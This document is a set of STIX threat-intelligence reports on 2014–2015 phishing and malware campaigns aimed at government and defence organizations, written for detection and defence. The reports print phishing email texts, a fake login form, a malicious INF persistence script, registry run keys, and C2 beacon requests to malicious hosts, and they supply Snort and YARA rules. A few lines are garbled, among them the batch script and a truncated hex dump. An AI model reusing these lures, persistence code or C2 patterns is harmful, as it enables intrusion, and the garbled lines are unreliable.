As of 19 November 2014. (19:29:29 UTC) kentawp.3322.org resolved to 23.104.55.227.

stix:STIX_Header.stix:Title: Phishing Email with Account Statement Theme Leads to Scanbox Fingerprinting Site
stix:STIX_Header.stix:Description: On 5 February 2015, a phishing email was sent from Alice.Wood@mastermindbackup.com to a defense industrial base (DIB) organization with the subject "Notice: Your Account Statement is Now Available". The email contained a malicious link to http://notice.mastermindbackup.com/notice/ (223.29.207.133). The malicious site checks the user's Adobe Flash version then eventually redirects to the legitimate site mastermindbackup.com.

stix:Indicator.indicator:Description:
---- BEGIN EMAIL HEADER ---- From Alice.Wood@mastermindbackup.com Thu Feb 5 13:58:15 2015 Return-Path: Subject: Notice: Your Account Statement is Now Available X-SENDER-IP: 76.77.18.145 X-SENDER-REPUTATION: -2.2 Received: from mail.scatui.com (HELO MARKET-60914FCA) ([76.77.18.145]) with ESMTP/TLS/DHE-RSA-AES128-SHA; 05 Feb 2015 18:47:01 +0000 Received: from no (Unknown [192.168.135.129]) by MARKET-60914FCA with ESMTPA; Fri, 6 Feb 2015 02:46:19 -0800 Message-ID: From: [REDACTED] Date: Fri, 6 Feb 2015 02:46:07 -0800 MIME-Version: 1.0 Content-Type: multipart/alternative; boundary="----=_NextPart_000_0AB0_01BBBB88.17F44190" X-Priority: 3 X-MSMail-Priority: Normal X-Mailer: Microsoft Outlook Express 6.00.2900.5594 X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5594 ---- END EMAIL HEADER ---- ---- BEGIN EMAIL BODY ----

Notice
Checking-2183 ending in 2183
Your account statement is now available

C T AND G ENTERPRISES INC,

We're letting you know that the most recent statement for your account is now available:

View your statement online

We'll ask you to enter your Online ID and Passcode for your protection when accessing your statement.

To view your statement or read your Privacy Notice, go to Find Documents on the Statements and Documents page within Online Banking.

---- END EMAIL BODY ----

EmailMessageObj:Header.EmailMessageObj:Subject: Notice: Your Account Statement is Now Available

stix:Indicator.indicator:Description:
The domain notice.mastermindbackup.com resolved to IP 223.29.207.133 at the time of the report. The malicious link from the email takes the user to a scanbox framework and then redirects to the legitimate site for mastermindbackup.com (38.64.152.20).
Scanbox checks for the Flash version and sends the results encoded in Base64 as a GET request:
GET /notice/RXh0LSBGbGFzaF92OiBTaG9ja3dhdmUgRmxhc2ggIDEzLjAuMC4yMTQJPD1kaXM9PixDOlwsRDpcCQ==.jpg HTTP/1.1 Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5 Referer: http://notice.mastermindbackup.com/notice/[REDACTED-10 digits].html Accept-Language: en-US User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) Accept-Encoding: gzip, deflate Host: notice.mastermindbackup.com DNT: 1 Connection: Keep-Alive Cookie: JPASIONID=656i6jvl1r7or8rb6b1j9677p4
URI base64 decode: Ext- Flash_v: Shockwave Flash 13.0.0.214 <=dis=>,C:\,D:\
Eventually, the user was redirected to the legitimate site:
HTTP/1.1 302 Moved Temporarily Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Type: text/html; charset=UTF-8 Expires: Thu, 19 Nov 1981 08:52:00 GMT Location: http://www.mastermindbackup.com Server: Microsoft-IIS/7.5 X-Powered-By: PHP/5.5.21 X-Powered-By: ASP.NET Date: Thu, 05 Feb 2015 20:04:19 GMT Content-Length: 155

stix:STIX_Header.stix:Title: Phishing Emails with Keep Your PC Up to Date Theme
stix:STIX_Header.stix:Description: On 29 January 2015, a set of phishing emails with the subject "Keep your PC up to date" was observed. The emails were sent from "win_microsafe@yahoo.com" and "win_mikrosaft@yahoo.com" with the same email body and included the same malicious attachment, Keep your PC up to date.doc (MD5: 807EE30ABBBFCF0C6923E64B89BF4074). If executed successfully, the malware communicates with three command and control (C2) locations, "indrajoh.ns01.biz", "mono_is.dns05.com", and 118.193.206.179. As of 4 March 2015, the domains "indrajoh.ns01.biz" and "mono_is.dns05.com" both map to the IP Address 118.193.206.179.

After that, all the latest security and performance improvements will be installed on your PC quickly and reliably. --- END EMAIL BODY ---

EmailMessageObj:Header.EmailMessageObj:Subject: Keep your PC up to date

stix:Indicator.indicator:Description:
The attachment "Keep your PC up to date.doc" is a malicious web archive file containing a CVE-2012-0158 exploit. If executed successfully the malware creates "C:\Documents and Settings\User\Local Settings\Temp\tmp1.tmp", benign MS Word documents "C:\Documents and Settings\User\Local Settings\Temp\Keep your PC up to date.doc" and "C:\Documents and Settings\User\Desktop\Keep your PC up to date.doc", and malicious DLL "C:\Documents and Settings\User\Application Data\Microsoft\Credentials\Credentials.ocx". Additionally, it adds persistence through the registry key "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Credentials = Rundll32.exe "C:\Documents and Settings\Administrator\Application Data\Microsoft\Credentials\Credentials.ocx",SSSS", which will execute "Credentials.ocx" after reboot. Finally, the malware launches the benign Word Document "C:\Documents and Settings\User\Local Settings\Temp\Keep your PC up to date.doc".
By packaging the exploit within the MIME document (Web archive file) instead of RTF or OLE Word document, the malware appears to avoid detection by half or more of the AV products. This particular piece of malware may be a new version of previously reported versions.

cybox:Properties.FileObj:File_Name: Keep your PC up to date.doc

stix:Indicator.indicator:Description: The benign Windows Word decoy Document "Keep your PC up to date.doc" (MD5: 99108D4A19902C38743BE13A000ECB61) is created by the malicious attachment "Keep your PC up to date.doc" (MD5: 807EE30ABBBFCF0C6923E64B89BF4074). It is most likely used to trick the recipient into not informing IT of an issue.

It is most likely used to trick the target into not informing IT of an issue.

stix:Indicator.indicator:Description:
The malicious DLL "Credentials.ocx" is created by the malicious attachment "Keep your PC up to date.doc". "Credentials.ocx" has 3 exports: "Embedding", "SSSS", and "StartWork". Once the computer is rebooted, "Credentials.ocx" is executed by rundll32.exe with the argument "-SSSS". If the argument "StartWork" is used, batch clean-up script "UnI61.bat" is written and executed and the following key is added to the registry "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Credentials = Rundll32.exe "C:\Documents and Settings\Administrator\Application Data\Microsoft\Credentials\Credentials.ocx",SSSS". "Credentials.ocx" also tries to contact 2 domains and 1 IP and attempts to download a JPG image file.
If the JPG download is successful, "Credentials.ocx" stores the JPG image file in three randomly named .MSI files in "C:\Documents and Settings\User\Application Data\Tasks\", one file for each successful connections to the following locations: indrajoh.ns01.biz mono_is.dns05.com 118.193.206.179

The IP address is one of the locations the Malicious DLL "Credentials.ocx" attempts to communicate with. The following are HTTP Headers sent to the IP address:
GET /128.32.jpg HTTP/1.1 User-Agent: MSIE(Version of Internet Explorer); NT(Operating system version and platform); AV(Security product index); OV(<MS Office version>); NA(WINDOWS HOSTNAME) VR(RAT VERSION STRING) Host: 118.193.206.179 Cache-Control: no-cache

The domain "indrajoh.ns01.biz" is one of the locations the Malicious DLL "Credentials.ocx" attempts to communicate with. The following are some HTTP Headers sent to the domain:
GET /1281.32.jpg HTTP/1.1 User-Agent: MSIE(Version of Internet Explorer); NT(Operating system version and platform); AV(Security product index); OV(<MS Office version>); NA(WINDOWS HOSTNAME) VR(RAT VERSION STRING) Host: indrajoh.ns01.biz Cache-Control: no-cache
As of 4 March 2015, this domain currently maps to the IP address 118.193.206.179.

The Batch clean-up script "UnI61.bat" is only installed and executed if the DLL "Credentials.ocx" is run with argument "-StartWork". The following are the contents of the file:
:Repeat del "C:\Documents and Settings\User\Desktop\Credentials.ocx" Ping 127.Security product index.Security product index.1 -n 3 if exist "C:\Documents and Settings\User\Desktop\Credentials.ocx" goto Repeat del %Security product index

The domain "mono_is.dns05.com" is one of the locations that the Malicious DLL "Credentials.ocx" attempts to communicate with. The following are some HTTP Headers sent to the domain:
GET /1282.32.jpg HTTP/1.1 User-Agent: MSIE(<Version of Internet Explorer>); NT(<Operating system version and platform>); AV(<Security product index>); OV(<MS Office version>); NA(<WINDOWS HOSTNAME>) VR(<RAT VERSION STRING>) Host: mono_is.dns05.com Cache-Control: no-cache
As of 4 March 2015, this domain maps to the IP Address 118.193.206.179.

The file "Credentials.ocx" (MD5: BBA3D5C70DF5E8571658E6673AC96B17) is the 64-bit version of "Credentials.ocx" (MD5: A08BA2BE47BD921D1066D11477F8F3C6). It is only created if "Keep your PC up to date.doc" (MD5: 807EE30ABBBFCF0C6923E64B89BF4074) is run on a 64-bit Operating System. See "Credentials.ocx" (MD5: A08BA2BE47BD921D1066D11477F8F3C6) for full analysis of 32-bit version.
This registry entry is added by the malicious attachment Keep your PC up to date.doc (MD5: 807EE30ABBBFCF0C6923E64B89BF4074) in order to maintain persistence on an exploited system.

stix:STIX_Header.stix:Title: Fax Themed Spear Phishing Emails Contain Malicious URLs
stix:STIX_Header.stix:Description: On 17 March 2015, a U.S. Government Department received multiple targeted emails with a fax-themed spear phishing campaign. In each of the email bodies, the domain in the URL was different. The URLs ended with "/FAX_MESSAGE-DATA-STORAGE/new_fax.message.html".

stix:Indicator.indicator:Description:
The fax number in the email subject line is a series of seven random digits.
The malicious link contains different domains in each email. http://[malicious-domain.com]/FAX_MESSAGE-DATA-STORAGE/new_fax.message.html

stix:STIX_Header.stix:Title: Phishing Email with Order PO Theme Leads to Credential Harvesting Site
stix:STIX_Header.stix:Description: On 21 to 22 May 2015, a phishing email was sent from lian.kim@vip.163.com to a financial sector organization with the subject "Re: Order PO". The email included a malicious link to "http://qcmwp.com/theme/2". The fraudulent site requests the user to enter Microsoft Office online credentials.

stix:Indicator.indicator:Description:
---- BEGIN EMAIL HEADER ---- Received: by 193.189.117.56.host.e-ring.pl (Postfix, from userid 0) id 8F57C180A81; Thu, 21 May 2015 02:53:07 -0400 (EDT) From: [REDACTED] <lian.kim@vip.163.com> To: [REDACTED] Subject: Re: Order PO Date: Thu, 21 May 2015 02:53:07 -0400 (EDT) more Content-Type: text/html Message-ID: <1432191187.19693.lian.kim@vip.163.com> Received: by 193.189.117.56.host.e-ring.pl (Postfix, from userid 0) id 8F57C180A81; Thu, 21 May 2015 02:53:07 -0400 (EDT) Reply-To: <lian.kim@vip.163.com> ---- END EMAIL HEADER ----
---- BEGIN EMAIL BODY ---- We are in need of this product. Please click here to see Sample and Order Specification. We need it urgently Thanks & Best regards [REDACTED] **************************** ZheJiang Electronics Co.,Ltd [REDACTED SIGNATURE] ---- END EMAIL BODY ----
A second wave of emails were also sent from lian.kim@vip.163.com and the sender IP 203.73.167.12.

As of 10 March 2015, the domain qcmwp.com resolved to IP address 192.185.108.34. The site displays a fraudulent Microsoft Excel spreadsheet with a login box requesting the user's email address and password:
---- BEGIN LOGIN WINDOW ---- Microsoft Excel Document
To view the document, sign in with your valid company email account
Email Address: Password:
Submit ---- END LOGIN WINDOW ----
The displayed spreadsheet is a commercial invoice from a vase trading company based in China called Guangzhou Vase Trading Co., LTD.

stix:STIX_Header.stix:Title: Snowden and UK Major Incident Procedure Manual Themed Phishing Emails
stix:STIX_Header.stix:Description:
On 13 November 2014 a U.S. government department reported observing two phishing emails targeting the same U.S. government domain. The first phishing email used the "From:" address nick.macpherson.uk@gmail.com and the subject "UK Major Incident Procedure Manual", the second used "From:" address susan.guscot@gmail.com and the subject "FW: Another Snowden Spy Story 20141111".
Both emails contained malicious attachments that installed malware that attempts to contact command and control (C2) servers on the domain www.nma.ftp1.biz using HTTP GET requests.
For more information on related phishing activity see previous reporting: IB-14-10563 IB-14-10190 IB-14-10166 IB-14-10118 IB-13-10810 IB-13-10774 IB-13-10764 AR-13-10014

stix:Indicator.indicator:Description:
----- BEGIN EMAIL HEADER #1 ----- From: Macpherson Nick <nick.macpherson.uk@gmail.com> To: Foo Irene <fcodigitaldiplomacy@gmail.com> Bcc: [REDACTED] Date: Tue Nov 11 02:22:55 GMT 2014 Subject: UK Major Incident Procedure Manual Attachment: UK Major Incident Procedure Manual.zip -----END EMAIL HEADER #1-----
-----BEGIN EMAIL BODY #1----- The contents of this Manual have been drafted in accordance with the latest agreed procedures of the Association of Chief Police Officers (ACPO), the Chief Fire Officers Association (CFOA), the Ambulance Service Association (ASA), London boroughs and the Home Office. Extensive consultation has also been undertaken with the military, voluntary services and emergency services of surrounding county areas. -----END EMAIL BODY #1-----

-----BEGIN EMAIL HEADER #2----- From: Guscott Susan <susan.guscot@gmail.com>; To: undisclosed-recipients:;; Bcc:[REDACTED] Date: Wed Nov 12 02:46:59 GMT 2014 Subject: FW: Another Snowden Spy Story 20141111 Attachment: Another Snowden Spy Story.rar -----END EMAIL HEADER #2-----
----- BEGIN EMAIL BODY #2 ----- For security reasons andencryption, password:snow123456 Please don'tleak -----END EMAIL BODY #2----
This file is a zip archive file, which contains the following files: uk-major-incident-manual.pdf (MD5 B4E81AE278DF8E8CF3F27624E1692AA0) Procedure.pps (MD5 C50B138BF76113F6BAD680C1FDD70138)
This file is a benign PDF decoy document.
This file is a malicious .pps (PowerPoint Show) document that contains two embedded files. The embedded files are as follows: 2.inf test.gif

Once executed, the INF file runs and changes the GIF file to EXE. The INF file then adds a RunOnce registry that causes the executable to be executed each time a user logs on. The contents of the file are as follows:
----Begin Code----- ; 61883.INF ; Copyright (c) Microsoft Corporation. All rights reserved. [Version] Signature = "$CHICAGO$" Class=61883 ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17} Provider=%Msft% DriverVer=06/21/2006,6.1.7600.16385 [DestinationDirs] DefaultDestDir = 1 [DefaultInstall] RenFiles = RxRename AddReg = RxStart [RxRename] server.exe, test.gif [RxStart] HKLM,Software\Microsoft\Windows\CurrentVersion\RunOnce,Install,,%1%\server.exe ----End Code-----

The file is renamed from test.gif to iexplore.exe by 2.inf(MD5 13EA47C096F01AFCE0906B8EBFFD8A36).
The registry is changed to add: HKU\S-1-5-21-1454471165-1644491937-839522115-1003\Software\Microsoft\Windows\CurrentVersion\Run\hotkey: "C:\Documents and Settings\User\Application Data\iexplore.exe -st"

The malicious process iexplore.exe(MD5 13EA47C096F01AFCE0906B8EBFFD8A36) attempts to make a DNS query to resolve the following domain: www.nma.ftp1.biz
The malware then attempts an HTTP GET request to TCP port 443.
The malware then listens on local host port 1024.
Sample HTTP GET request is as follows: GET .bin HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E) Host: < RESOLVED IP address from www.nma.ftp1.biz> Connection: Keep-Alive
The Host field of the beacon is the resolved IP address of www.nma.ftp1.biz Sample HTTP GET request in HEX form is as follows: 00000000 47 45 54 20 2f 32 33 71 52 4a 65 30 49 6f 48 44 GET /23q RJe0IoHD 00000010 52 43 79 63 42 79 58 35 7a 51 54 2f 70 48 72 72 RCycByX5 zQT/pHrr 00000020 39 76 52 66 45 33 66 76 50 6a 76 62 44 53 31 6c 9vRfE3fv PjvbDS1l 00000030 4f 78 6c 54 7a 63 34 57 2f 33 4c stix:STIX_Header.stix:Title: Phishing Email Contains Link to Angler Exploit Kit
stix:STIX_Header.stix:Description:
Between 16 and 17 September 2014, a government department reported phishing emails that contained malicious links targeting at least 15 employees. The malicious links in the emails directed recipients to infected websites where the suspected Angler Exploit Kit payloads would be downloaded to the victims.
Based on open source research the Angler Exploit Kit has the capability to scan a redirected host for several different software vulnerabilities. Once a vulnerability is discovered, a tailored exploit is sent to the host. The host then downloads multiple pieces of malware from a remote server.
Open source research for Angler EK: http://malware-traffic-analysis.net/2014/09/16/index2.html

stix:Indicator.indicator:Description:
---BEGIN EMAIL HEADER--- Subject: [IMPORTANT] Amount overdue From: [REDACTED] <alfredo.jimenez@rr.com>; To: [REDACTED]; Date: Wed Sep 17 11:05:46 GMT 2014 Message-ID: <A16DA46DC99760233491333CDF08B5FA-34d5a16033faca567366cb5d29c79ea@[REDACTED]> MIME-Version: 1.0 Content-Type: multipart/alternative; boundary="df4ddcef_90d0fef3_1b9" X-Mailer: WhatCounts ENVID: WC-1583852418909-A16DA46DC99760233491333CDF08B5FA-34d5a16033faca567366cb5d29c79ea List-Unsubscribe: <http://email.92987d3b416.com/u?id=A16DA46DC99760233491333CDF08B5FA-34d5a16033faca567366cb5d29c79ea> X-Unsubscribe-Web: <http://email.0eb99eebd0d2.com/u?id=A16DA46DC99760233491333CDF08B5FA-34d5a16033faca567366cb5d29c79ea> ---END EMAIL HEADER---
---BEGIN EMAIL BODY--- We are writing to you about fact, despite previous reminders, there remains an outstanding amount of GBP 240.86 in respect of the invoice contained in this letter. This was due for payment on 20 August, 2014. Our credit terms stipulate full payment within 3 days and this amount is now 14 days overdue. The total amount due from you is therefore GBP 342.75 If the full amount of the sum outstanding, as set above, is not paid within 7 days of the date of this email, we will begin legal action, without warning, for a court order requiring payment. We may also commence insolvency proceedings. Legal proceedings may take effect on any credit rating. The costs of legal proceedings and any other amounts which the court orders must also be paid in addition to the debt. This email is being sent to you according to the Practice Direction on Pre-Action Conduct (the PDPAC) contained in the Civil Procedure Rules, The court has the power to sanction your continuing failure to respond. To view the the original invoice please follow link We await prompt response to this email. Sincerely, Alfredo Jimenez. ---END EMAIL BODY---
The 15 recipients received similar content with only minor changes to email sender/receiver, subject line, amount of money owed, due date, and the malicious link URL. The following subject lines were used:
[IMPORTANT] Regarding payment overdue [IMPORTANT] Recent invoice [IMPORTANT] Final letter before commencing legal action [IMPORTANT] Payment overdue notification [IMPORTANT] Amount overdue notification [IMPORTANT] Final notification before commencing legal action [IMPORTANT] Invoice overdue notification [IMPORTANT] Amount overdue [IMPORTANT] Notification about the amount overdue [IMPORTANT] Latest invoice [IMPORTANT] Invoice overdue [IMPORTANT] Recent invoice unpaid [IMPORTANT] Last letter before commencing legal action [IMPORTANT] Latest letter on invoice overdue [IMPORTANT] Last notification before commencing legal action
This is one of the observed malicious URLs.

stix:STIX_Header.stix:Title: Command and Control IP Addresses and Backdoor Implant Traffic Observed
stix:STIX_Header.stix:Description:
On 23 December 2014, it was reported that malware activity had been observed on a network. The implant observed is a backdoor listener that is designed as a service DLL file. It includes functionality such as file transfer, system survey, process manipulation, file time matching and proxy capability. It can also perform arbitrary code execution and execute commands on the command line. The implant on the exploited machines communicated with multiple IP addresses registered in various countries.
The import hash of this malware is: ab4abee83ffd526f1975eb48dbdbc812
The bot malware contained multiple capabilities: - Download .exe files (and presumably execute) - Change configuration - Update - Delete itself - Attack using DDoS - Stop the attack
This Snort rule should be able to detect at least some variants of this malware:
alert tcp any any -> any any (msg:"DDoS_HANDSHAKE_SUCCESS"; dsize:6; flags:PA; content:"|18 17 e9 e9 e9 e9|"; depth:6; sid:1234; )
The following YARA rules are provided to enable additional detection capabilities:
rule DDoS_Misspelled_Strings { strings: $STR1 = "Wating" wide ascii $STR2 = "Reamin" wide ascii $STR3 = "laptos" wide ascii condition: (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 2 of them } rule DDoS_RandomURLBuilder { strings: $randomUrlBuilder = { 83 EC 48 53 55 56 57 8B 3D ?? ?? ?? ?? 33 C0 C7 44 24 28 B4 6F 41 00 C7 44 24 2C B0 6F 41 00 C7 44 24 30 AC 6F 41 00 C7 44 24 34 A8 6F 41 00 C7 44 24 38 A4 6F 41 00 C7 44 24 3C A0 6F 41 00 C7 44 24 40 9C 6F 41 00 C7 44 24 44 94 6F 41 00 C7 44 24 48 8C 6F 41 00 C7 44 24 4C 88 6F 41 00 C7 44 24 50 80 6F 41 00 89 44 24 54 C7 44 24 10 7C 6F 41 00 C7 44 24 14 78 6F 41 00 C7 44 24 18 74 6F 41 00 C7 44 24 1C 70 6F 41 00 C7 44 24 20 6C 6F 41 00 89 44 24 24 FF D7 99 B9 0B 00 00 00 F7 F9 8B 74 94 28 BA 9C 6F 41 00 66 8B 06 66 3B 02 74 34 8B FE 83 C9 FF 33 C0 8B 54 24 60 F2 AE 8B 6C 24 5C A1 ?? ?? ?? ?? F7 D1 49 89 45 00 8B FE 33 C0 8D 5C 11 05 83 C9 FF 03 DD F2 AE F7 D1 49 8B FE 8B D1 EB 78 FF D7 99 B9 05 00 00 00 8B 6C 24 5C F7 F9 83 C9 FF 33 C0 8B 74 94 10 8B 54 24 60 8B FE F2 AE F7 D1 49 BF 60 6F 41 00 8B D9 83 C9 FF F2 AE F7 D1 8B C2 49 03 C3 8B FE 8D 5C 01 05 8B 0D ?? ?? ?? ?? 89 4D 00 83 C9 FF 33 C0 03 DD F2 AE F7 D1 49 8D 7C 2A 05 8B D1 C1 E9 02 F3 A5 8B CA 83 E1 03 F3 A4 BF 60 6F 41 00 83 C9 FF F2 AE F7 D1 49 BE 60 6F 41 00 8B D1 8B FE 83 C9 FF 33 C0 F2 AE F7 D1 49 8B FB 2B F9 8B CA 8B C1 C1 E9 02 F3 A5 8B C8 83 E1 03 F3 A4 8B 7C 24 60 8D 75 04 57 56 E8 ?? ?? ?? ?? 83 C4 08 C6 04 3E 2E 8B C5 C6 03 00 5F 5E 5D 5B 83 C4 48 C3 } condition: $randomUrlBuilder }

stix:STIX_Header.stix:Title: Phishing Email with Industrial Invoice Theme Leads to Malware
stix:STIX_Header.stix:Description:
On 21 October 2014, a phishing email was sent from ps5570817@humbermerchants.co.uk with the subject "Industrial Invoices" to an aerospace organization. The email content spoofed a legitimate supplier of industrial parts. It included the malicious attachment 15040BII3646501.doc (MD5: 79933afb657a9f2b9544db58ceee382d). Malware called back to IP 188.191.153.51 and 62.75.182.94.
A US Government Agency also received this phishing email on 21 October 2014.

stix:Indicator.indicator:Description:
---- BEGIN EMAIL HEADER ---- Received: from [REDACTED] (using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits)) (No client certificate requested) by [REDACTED] (Postfix) with ESMTPS id 3jMTxL1NNmz3WgZw for [REDACTED]; Tue, 21 Oct 2014 02:26:46 -0700 (PDT) Received: from localhost (localhost [127.0.0.1]) by [REDACTED]; Tue, 21 Oct 2014 04:26:45 -0500 Received: from speed-pc (121-254-112-209.veetime.com [121.254.112.209]) by [REDACTED] for [REDACTED]; Tue, 21 Oct 2014 04:26:28 -0500 From: ps5570817@humbermerchants.co.uk Message-ID: <zfbnszvr.ps@humbermerchants.co.uk> Date: Tue, 21 Oct 2014 17:26:25 +0800 Subject: Industrial Invoices To: [REDACTED] MIME-Version: 1.0 Content-Transfer-Encoding: 7bit Content-Type: multipart/mixed; charset=us-ascii; boundary="DbMail-MIME-Boundary-19274" X-TM-AS-MML: enable X-TM-AS-ERS: 121.254.112.209-127.5.254.1 X-TM-AS-Product-Ver: IMSS-7.1.0.1597-7.5.0.1017-21040.005 X-TM-AS-Result: No--9.812-5.0-31-10 X-imss-scan-details: No--9.812-5.0-31-10;No--9.812-10.0-31-10;No--9.812-5.0-31-10 X-TM-AS-Result-Xfilter: Match text exemption rules:No;Match text exemption rules:No X-TMASE-MatchedRID: LKmWh/e9ZPVm9byiFpm66pObxJgN/hOxNlJkXYyJkGCInvV8Dy0ZaJKQ lsyF4c0BF5diznbYrvtpsOL7DP9qw11RKHZWvYFJA9GEZfTBPeVCdUZFvvy+kFvo8FSqar5SzpE TVuuZLR0vo+WI0Befl9KOvo77fK0suyFYMQG32ZKmf8CvlpqLhyHmjNSy4BIidQgf7bli9LxLKC MXjUa0pz9rn7Xovn5G5KkS5+sYnf3sqVV33HUEZPhcYJpuqXFIlyWvX89R1wMPTgAv+IX2hufsR wza/3ksjkR/pNlfPUkaOQRhvL4x1fur6EqBUeGvF6NQZMaBYOKDhPhKLL3wT0hxI0deHEsZYwjW 63Ry3jjR/w53k8MSfygBV0eBE7SY ---- END EMAIL HEADER ----
---- BEGIN EMAIL BODY ---- From: ps5570817@humbermerchants.co.uk [mailto:ps5570817@humbermerchants.co.uk] Sent: Tuesday, October 21, 2014 4:26 AM Subject: Industrial Invoices
Attached are accounting documents from Humber Merchants
Humber Merchants Group
Head Office: [REDACTED signature block]
Attachment: 15040BII3646501.doc ---- END EMAIL BODY ----

This malicious document contained multiple strings.
Notable Ascii Strings: facepa1m@live.ru facepa1m@live.ru \SHXPQCJGTOH.com ID="{2DAAF683-C2CE-4846-8EBD-5D8A9BA07B9E}" Document=ThisDocument/&H00000000 Name="Project" HelpContextID="0" VersionCompatible32="393222000" CMG="0A083C344238423842384238" DPB="14162246265127512751" GC="1E1C2858386843694369BC" [Host Extender Info] &H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000 [Workspace]
Notable Unicode Strings: Project.ThisDocument.AJMLBVAWVNS facepa1m@live.ru *\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\PROGRA~2\COMMON~1\MICROS~1\VBA \VBA6\VBE6.DLL#Visual Basic For Applications *\G{00020905-0000-0000-C000-000000000046}#8.3#0#C:\Program Files (x86)\Microsoft Office \OFFICE11\MSWORD.OLB#Microsoft Word 11.0 Object Library *\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\Windows\SysWOW64\stdole2.tlb#OLE Automation *\CNormal *\CNormal *\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.3#0#C:\Program Files (x86)\Common Files \Microsoft Shared\OFFICE11\MSO.DLL#Microsoft Office 11.0 Object Library
This site hosted the malicious file 1.exe (MD5: 071b380d6b422dd83f14fa0a3bceb347).

This file was downloaded from www.gpsbah.com or gpsbah.com. When 1.exe executes as "C:\Documents and Settings\[User]\Local Settings\Temp\SHXPQCJGTOH.com" it creates a new hidden file, edg2.exe (MD5: adac1acd630ef7956f3c879d8238d9ad), in the application data folder of the user profile. This file displays Russian copyright and description in the file properties.
This file is the payload installed by 1.exe (MD5: 071b380d6b422dd83f14fa0a3bceb347). It attempted to communicate with the IP addresses 188.191.153.51 and 62.75.182.94.

The malware edg2.exe sent numerous HTTP requests. The following HTTP POST request is a sample of traffic that was sent destined for port 8080:
POST /ZTnLxsfYU%7E/S6smj_cPeEpZ/6C%3F3J%24zv./S HTTP/1.1 Host: 188.191.153.51 Connection: Close User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko Content-Type: octet/binary Accept: */* Accept-Language: q=0.8,en-US;q=0.6,en;q=0.4 Content-Length: 596
The malware edg2.exe (MD5: adac1acd630ef7956f3c879d8238d9ad) attempted to communicate with 62.75.182.94.

stix:STIX_Header.stix:Title: Malicious Redirect Site Associated with PlugX Malware in East Asia
stix:STIX_Header.stix:Description: On 23 September 2014, a malicious redirect site http://jre76.java-se.com/js/rss.js (211.125.81.203) was associated with Operation Hurricane activity and PlugX malware attacks in East Asia.

stix:Indicator.indicator:Description:
The data source observed redirects from the Japanese news site asia.nikkei.com to this URL. The redirect site resolved to IP 211.125.81.203. This IP was mentioned in the FireEye Operation Poisoned Hurricane article: http://www.fireeye.com/blog/technical/targeted-attack/2014/08/operation-poisoned-hurricane.html
The FireEye article mentions signed malware including a certificate of "Ssangyong Motor Co." which is mentioned in a recent Palo Alto Networks article, along with the java-se.com domain: http://researchcenter.paloaltonetworks.com/2014/08/attacks-east-asia-using-google-code-command-control/

stix:STIX_Header.stix:Title: Spear Phishing Email with Syria Chlorine Attack Video Theme
stix:STIX_Header.stix:Description:
On 17 April 2015, a spear phishing campaign was observed targeting a U.S. Government Agency with the subject "Syria attack video moves UN to tears" and the attachment "Chlorine Video.doc" (MD5:33D369E6455BE9DA7FDAE863B2CF8152) sent from helen.mitchell.dfat@gmail.com. The attachment contained malware that exploited CVE-2012-0158 and called back to apple.dnsrd.com.
The sender and forwarded email addresses were previously use in phishing campaigns that were identified as Team 338 activity.

stix:Indicator.indicator:Description:
The sender email address is believed to be controlled by a malicious actor and is intended to look like the legitimate email of a real individual. The forwarded message from hasnain.hewitt@gmail.com has also been observed in other phishing/spear phishing email campaigns.
----- BEGIN EMAIL HEADER ----- From: [REDACTED] <helen.mitchell.dfat@gmail.com>; To: [REDACTED] Bcc: [REDACTED] Date: Fri Apr 17 09:46:37 GMT 2015 Subject: Fwd: Syria attack video moves UN to tears Attachment: Chlorine Video.doc (83906 bytes); ----- END EMAIL HEADER -----
----- BEGIN EMAIL BODY ----- ---------- Forwarded message ---------- From: [REDACTED] <hasnain.hewitt@gmail.com> Date: 2015-04-17 17:30 GMT+08:00 Subject: Syria attack video moves UN to tears To: [REDACTED] <helen.mitchell.dfat@gmail.com> A video showing desperate attempts by doctors to save three children after an apparent chlorine gas attack in Syria moves UN Security Council members to tears. ----- END EMAIL BODY -----
The malicious sender helen.mitchell.dfat@gmail.com was also seen in other phishing and spear phishing campaigns associated with Team 338 activity:
IB-14-10617 IB-14-10563 IB-14-10496 IB-14-10303 IB-14-10178 IB-14-10175 IB-14-10171 IB-14-10166 IB-14-10145 IB-14-10118
The forwarded message from hasnain.hewitt@gmail.com has also been observed in other phishing and spear phishing campaigns, as previously reported in IB-14-10161.

EmailMessageObj:Header.EmailMessageObj:Subject: Syria attack video moves UN to tears

stix:Indicator.indicator:Description:
The malicious attachment creates three files. Two are benign word documents, both named "Chlorine Video.doc" (MD5:66BC063740FDB19F8AF35DFAD8FB58A9). One is saved to the desktop, and the file with MD5:E617348B8947F28E2A280DD93C75A6AD is saved in the Temp folder.
The third file, word.exe (MD5: A75621DED74503AE5ACEFCD858255A14), is renamed update.exe and is malicious.

Path:C:\DOCUME~1\[USER]\LOCALS~1\Temp\update.exe The file is moved from "%temp%\word.exe" to "%temp%\update.exe" The malware will execute on the next login/reboot and makes a DNS query for "apple.dnsrd.com". The malware then attempts a connection to port 443. If successful, it sends an HTTP GET request.
